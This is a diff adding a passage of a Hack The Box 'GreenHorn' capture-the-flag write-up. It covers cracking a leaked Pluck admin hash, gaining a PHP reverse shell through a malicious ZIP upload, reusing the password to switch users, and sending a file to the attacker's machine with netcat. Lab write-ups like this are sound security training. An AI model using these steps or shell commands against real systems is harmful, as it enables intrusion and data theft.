@@ -104,6 +104,101 @@ Looking at the web server it seems like it’s running Pluck, a PHP CMS.
 
 Looking through the web server nothing seems interesting, testing for LFI it doesn’t seem to work neither. Heading to the admin panel, a password is being required and we have been given the Pluck version. As a basic intution, searching that version over exploit-db won’t help us neither.
 
+
+![/etc/hosts](02.png){: width="1200" height="800" }
+
+**Web Server at Port 3000**
+
+As we reach a dead end on port 80, we decided to look at the port 3000 where we found a free-password Gitea repository which had the source code of the web application hosted on port 80 `GreenHorn`
+
+
+![/etc/hosts](03.png){: width="1200" height="800" }
+
+Digging through the source code looking for config files, we come across a password file located at
+`http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php`
+
+![/etc/hosts](04.png){: width="1200" height="800" }
+
+Passing the hash to hashcat we were able to crack it and retrieve the admin password.
+```console
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/GreenHorn]
+└─$ hashcat -a0 -m1700 hash.txt /usr/share/wordlists/rockyou.txt --show
+d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d[REDACTED]:[REDACTED]
+```
+Putting the password in `http://greenhorn.htb/login.php` we were able to `login` successfully.
+
+![/etc/hosts](05.png){: width="1200" height="800" }
+
+**Exploitation**
+**Horizontal Escalation - user.txt**
+It’s time for a reverse shell, we know that Pluck 4.7.18 is vulnerable to [RCE](https://www.exploit-db.com/exploits/51592), we can upload a malicious ZIP file that contains a PHP script that will establish a connection for us.
+
+```console
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/GreenHorn]
+└─$ zip reverse.zip reverse.php             
+  adding: reverse.php (deflated 59%)
+```
+![/etc/hosts](06.png){: width="1200" height="800" }
+Setting up a listener using netcat, we instantly get a shell as `www-data`!
+```console
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/GreenHorn]
+└─$ nc -lnvp 4444   
+listening on [any] 4444 ...
+connect to [10.10.15.7] from (UNKNOWN) [10.10.11.25] 57100
+Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 19:12:53 up 6 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$
+```
+Upgrading the shell to a stable one,
+
+```console
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@greenhorn:/$ export TERM=xterm
+export TERM=xterm
+www-data@greenhorn:/$ ^Z
+zsh: suspended  nc -lnvp 4444
+                                                                                                                      
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/GreenHorn]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lnvp 4444
+
+www-data@greenhorn:/$
+```
+Looking for existing users on the host, we find git and junior.
+
+```console
+www-data@greenhorn:/$ ls -la /home
+total 16
+drwxr-xr-x  4 root   root   4096 Jun 20 06:36 .
+drwxr-xr-x 20 root   root   4096 Jun 20 07:06 ..
+drwxr-x---  2 git    git    4096 Jun 20 06:36 git
+drwxr-xr-x  3 junior junior 4096 Jun 20 06:36 junior
+www-data@greenhorn:/$
+```
+Connecting to Junior with the password we got from cracking the hash we were able to switch to Junior’s account
+
+```console
+www-data@greenhorn:/tmp$ su junior
+Password: 
+junior@greenhorn:/tmp$ cd
+junior@greenhorn:~$ ls
+ user.txt  'Using OpenVAS.pdf'
+```
+Once we get access to junior we can read the `user.txt` file!
+
+**Vertical Escalation - root.txt**
+
+Inside the home directory of junior we can see that there is a PDF file `'Using OpenVAS.pdf'`, we transfer it to our local machine with nc
+
+```console
+junior@greenhorn:~$ nc -q 0 10.10.15.7 9000 < 'Using OpenVAS.pdf'
+```
+
 <html lang="en">
 <head>
   <meta charset="UTF-8">
